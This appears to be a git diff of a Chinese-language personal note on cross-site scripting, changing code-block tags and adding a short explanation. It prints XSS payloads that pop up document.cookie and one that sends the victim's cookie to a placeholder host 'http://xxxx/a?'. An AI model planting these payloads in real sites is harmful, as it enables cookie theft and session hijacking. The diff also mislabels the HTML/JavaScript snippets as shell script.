@@ -12,28 +12,34 @@
 img标签支持onerror 事件，在装载文档或图像的过程中如果发生了错误，就会触发onerror事件。
 ```
 #### 获取当前站点的cookie
-```javascript
+```shell script
 <img src=## onerror=alert(document.cookie)>
 ```
 ![image](https://github.com/498946975/Security/blob/master/images/xss_2.png)
 ### 4、a标签，实行js代码
 #### 鼠标移动到这的时候，才执行代码
-```javascript
+```shell script
 <a onmouseover=alert(document.cookie)>xxs link</a>
 ```
 ![image](https://github.com/498946975/Security/blob/master/images/xss_3.png)
 
 ### 5、DOM的xss反射
 #### 1、反弹cookie
-```javascript
+```shell script
 <script>var img=document.createElement("img");img.src=alert(document.cookie); </script>
+```
+```yaml
+代码解析：
+    1、定义一个img变量
+    2、这个变量就是html里面的标签，因为是document.XXX
+    3、img变量的值是alert（document.cookie）
 ```
 ### 6、发送当前cookie到某个服务器
 #### 必须登陆才能访问cookie
 #### 一般情况下，从web服务的日志中查看cookie
 #### 把cookie弹出来，访问这个http链接，上传到服务器日志
 #### 用法就是
-```javascript
+```shell script
 <script> var img=document.createElement("img");img.src="http://xxxx/a?"+escape(document.cookie);
 ```
 #### 以下链接，谁点，就发送谁172.16.120.252:8080的cookie到 http://xxxx/a?
